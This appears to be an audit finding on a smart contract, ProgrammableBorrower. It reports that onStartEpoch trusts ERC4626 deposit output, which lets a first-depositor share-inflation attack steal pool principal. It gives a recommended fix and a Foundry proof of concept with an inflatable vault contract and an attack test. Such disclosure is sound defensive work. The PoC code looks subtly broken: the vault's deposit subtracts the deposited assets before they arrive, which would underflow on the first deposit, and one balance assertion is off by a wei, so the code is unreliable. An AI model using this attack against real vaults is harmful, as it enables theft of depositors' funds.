### ProgrammableBorrower trusts ERC4626 deposit output, allowing vault-share inflation to steal pool principal - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower.onStartEpoch` deposits all idle underlying into an arbitrary configured ERC4626 vault but does not enforce a minimum number of shares or validate that the returned shares preserve the deposited value. If the configured vault is empty or economically small, an unprivileged vault user can perform a first-depositor/share-price inflation attack so that the pool's deposit mints zero or near-zero shares. The pool funds remain inside the ERC4626 vault, where their claim accrues disproportionately to the attacker's shares and can be withdrawn by the attacker.

### Finding Description
The only vault compatibility checks are that the vault address is nonzero and `vault.asset()` matches the CDO underlying token. The contract grants that vault unlimited underlying allowance during initialization. `onStartEpoch` measures `currentVaultAssets`, snapshots `startAssets`, and then deposits the full idle token balance through `_depositToVault`. Although `vault.deposit` returns a share count, `_depositToVault` merely emits it and never checks that it is nonzero or economically equivalent to the transferred assets.

This is the credit-vault analog of loading attacker-crafted state without bounds validation: an attacker-controlled ERC4626 share-price boundary is loaded directly into pool accounting as if it were canonical. A standard first-depositor sequence can cause the pool to transfer a large underlying amount while receiving shares worth substantially less than the deposit.

### Impact Explanation
An attacker can capture up to the entire idle underlying balance parked into the ERC4626 vault at epoch start. In the complete-zero-share case, `ProgrammableBorrower` transfers all idle principal to the vault and retains no vault shares, while the attacker controls the vault's outstanding share supply and can redeem the pooled assets.

If the attack produces dust-valued shares rather than exactly zero, the loss equals:

```text
depositAmount - convertToAssets(returnedPoolShares)
```

at the time of deposit. The accounting later recognizes this as `vaultLoss` through `_vaultNetInterest`, but that only records the insolvency; it does not recover the ERC4626 assets or stop the attacker from redeeming them.

### Likelihood Explanation
Likelihood depends on the configured ERC4626 vault being empty, economically tiny, or otherwise vulnerable to first-depositor/share-price manipulation when `onStartEpoch` deposits pool cash. The attacker does not need a privileged protocol role: being an ordinary depositor/token sender to the selected ERC4626 vault is sufficient. Owner/manager actions only need to proceed honestly through their normal `startEpoch` call; the attacker can prepare the vault state beforehand.

The issue is not prevented by:

- the vault-asset check in `initialize`;
- `nonReentrant`;
- the pre-deposit `startAssets` snapshot;
- ERC20 allowance restrictions;
- CDO-only access to `onStartEpoch`.

The vulnerable trust boundary is that the returned ERC4626 shares are accepted without a lower bound.

### Recommendation
Require a minimum share amount or minimum post-deposit asset value when deploying idle funds:

```solidity
uint256 shares = vault.deposit(_assetAmount, address(this));
if (
  shares == 0 ||
  vault.convertToAssets(shares) < _assetAmount * minBps / BPS
) {
  revert InvalidAmount();
}
```

Better still, avoid balance-dependent ERC4626 vaults without virtual assets/shares or require a deployment-time invariant such as minimum total assets and total supply. Any partial deposit that violates the configured slippage bound should revert before `epochAccountingActive` is set.

### Proof of Concept
A reproducible Foundry test can use a minimal first-depositor-vulnerable ERC4626 vault:

```solidity
contract InflatableVault is ERC20 {
  IERC20 public assetToken;

  constructor(IERC20 asset_) ERC20("Vault", "V") {
    assetToken = asset_;
  }

  function asset() external view returns (address) {
    return address(assetToken);
  }

  function totalAssets() public view returns (uint256) {
    return assetToken.balanceOf(address(this));
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply();
    return supply == 0 ? shares : shares * totalAssets() / supply;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    uint256 supply = totalSupply();
    uint256 beforeAssets = totalAssets() - assets;
    shares = supply == 0 || beforeAssets == 0
      ? assets
      : assets * supply / beforeAssets;
    assetToken.transferFrom(msg.sender, address(this), assets);
    _mint(receiver, shares);
  }

  function redeem(uint256 shares, address receiver, address owner)
    external
    returns (uint256 assets)
  {
    assets = convertToAssets(shares);
    _burn(owner, shares);
    assetToken.transfer(receiver, assets);
  }
}
```

Attack sequence:

```solidity
function test_epochStartShareInflationStealsPoolCash() public {
  // Attacker initializes the external vault share supply at dust value.
  underlying.mint(attacker, 1_000_000 ether + 1);
  vm.startPrank(attacker);
  underlying.approve(address(inflatableVault), type(uint256).max);
  inflatableVault.deposit(1, attacker);

  // Inflate each share to more than the pool deposit.
  underlying.transfer(address(inflatableVault), 1_000_000 ether);
  vm.stopPrank();

  // Honest lifecycle call: IdleCDO sends pool cash to ProgrammableBorrower,
  // then invokes onStartEpoch.
  underlying.mint(address(programmableBorrower), 999_999 ether);
  vm.prank(idleCDO);
  programmableBorrower.onStartEpoch(0);

  // Pool deposited almost 1m but received zero shares.
  assertEq(inflatableVault.balanceOf(address(programmableBorrower)), 0);

  // Attacker redeems its dust share for the vault balance.
  uint256 attackerBefore = underlying.balanceOf(attacker);
  vm.prank(attacker);
  inflatableVault.redeem(
    inflatableVault.balanceOf(attacker),
    attacker,
    attacker
  );

  assertEq(underlying.balanceOf(attacker) - attackerBefore, 1_999_999 ether);
  assertEq(programmableBorrower.vaultInterestAccrued(), 0);
  assertEq(programmableBorrower.vaultLoss(), 999_999 ether);
}
```

The exact integer split depends on the vault's share formula, but the violation is deterministic whenever the attacker can make `deposit` return fewer economically backed shares than the deposited principal.
